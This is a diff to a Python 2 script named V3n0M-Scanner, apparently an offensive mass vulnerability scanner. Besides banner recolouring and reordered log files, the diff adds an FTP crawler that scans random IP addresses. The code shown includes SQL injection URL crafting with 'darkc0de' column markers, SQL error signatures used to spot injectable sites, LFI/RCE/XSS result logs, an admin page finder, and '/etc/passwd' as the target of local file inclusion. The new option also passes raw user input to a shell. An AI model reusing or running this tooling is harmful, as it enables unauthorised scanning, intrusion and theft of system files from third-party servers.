@@ -60,16 +60,16 @@ except:
 # Banner
 def logo():
 	print R + "\n|----------------------------------------------------------------|"
-	print "|     V3n0M-Scanner.py                                           |"
+	print "|     V3n0mScanner.py                                            |"
 	print "|     Release Date 02/12/2013  - Release Version V.3.3.2         |"
 	print "|          						         |"
 	print "|          " + B + "   NovaCygni  Architect  d4rkcat" + R + "                      |"
 	print "|                    _____       _____                           |"
-	print "|                   |____ |     |  _  |                          |"
-	print "|             __   __   / /_ __ | |/' |_ __ ___                  |"
-	print "|             \ \ / /   \ \ '_ \|  /| | '_ ` _ \                 |"
-	print "|              \ V /.___/ / | | \ |_/ / | | | | |                |"
-	print "|    Official   \_/ \____/|_| |_|\___/|_| |_| |_|  Release       |"
+	print "|          " + G + "         |____ |     |  _  |    " + R + "                      |"
+	print "|             __   __   / /_ __ | |/' |_ _" + G + "_ ___             " + R + "     |"
+	print "|             \ \ / /  " + G + " \ \ '" + R + "_ \|  /| | '_ ` _ \                 |"
+	print "|              \ V" + G + " /.___/ / | | \ |_" + R + "/ / | | | | |                |"
+	print "|    Official   \_/" + G + " \____/|_" + R + "| |_|" + G + "\___/|_| |_| " + R + "|_|  Release       |"
 	print "|    							         |"
 	print "|----------------------------------------------------------------|\n"
 
@@ -408,7 +408,6 @@ def colfinder():
 						print "[+] SQLi URL:", site + arg_end
 						site = site.replace("," + nullcol[0] + ",", ",darkc0de,")
 						site = site.replace(arg_eva + nullcol[0] + ",", arg_eva + "darkc0de,")
-
 						site = site.replace("," + nullcol[0], ",darkc0de")
 						print "[+] darkc0de URL:", site
 						darkurl.append(site)
@@ -495,7 +494,6 @@ def colfinder():
 				print "[!] Fuzzing is finished!"
 				break
 			except(KeyboardInterrupt, SystemExit):
-
 				raise
 
 def fscan():
@@ -568,6 +566,7 @@ def fmenu():
 	print "[11] Found vuln in last scan"
 	print "[12] New scan"
 	print "[13] Admin page finder"
+	print "[14] FTP crawler"
 	print "[0] Exit\n"
 	chce = raw_input(":")
 	if chce == '1':
@@ -629,6 +628,13 @@ def fmenu():
 		pwd = os.path.dirname(str(os.path.realpath(__file__)))
 		findadmin = subprocess.Popen(pwd + "/modules/adminfinder.py -w modules/adminlist.txt -u " + str(afsite), shell=True)
 		findadmin.communicate()
+		
+	elif chce == '14':
+		randips = raw_input("How many IP addresses do you want to scan: ")
+		print B
+		pwd = os.path.dirname(str(os.path.realpath(__file__)))
+		ftpcrawl = subprocess.Popen(pwd + "/modules/ftpcrawler.py -i " + str(randips), shell=True)
+		ftpcrawl.communicate()
 
 	elif chce == '0':
 		print R + "\n Exiting ..."
@@ -660,7 +666,6 @@ sqlerrors = {'MySQL': 'error in your SQL syntax',
 			 'Error Occurred While Processing Request': 'Error Occurred While Processing Request',
 			 'Server Error': 'Server Error',
 			 'Microsoft OLE DB Provider for ODBC Drivers error': 'Microsoft OLE DB Provider for ODBC Drivers error',
-
 			 'Invalid Querystring': 'Invalid Querystring',
 			 'OLE DB Provider for ODBC': 'OLE DB Provider for ODBC',
 			 'VBScript Runtime': 'VBScript Runtime',
@@ -710,20 +715,19 @@ else:
 	logo()
 
 lfi_log = "v3n0m-lfi.txt"
-lfi_log_file = open(lfi_log, "a")
 rce_log = "v3n0m-rce.txt"
-rce_log_file = open(rce_log, "a")
 xss_log = "v3n0m-xss.txt"
-xss_log_file = open(xss_log, "a")
 admin_log = "v3n0m-admin.txt"
+lfi_log_file = open(lfi_log, "a")
+rce_log_file = open(rce_log, "a")
+xss_log_file = open(xss_log, "a")
 admin_log_file = open(admin_log, "a")
-
 arg_end = "--"
 arg_eva = "+"
 colMax = 60 # Change this at your will
 gets = 0
-file = "/etc/passwd"
 timeout = 75
+file = "/etc/passwd"
 socket.setdefaulttimeout(timeout)
 menu = True
 fscan()
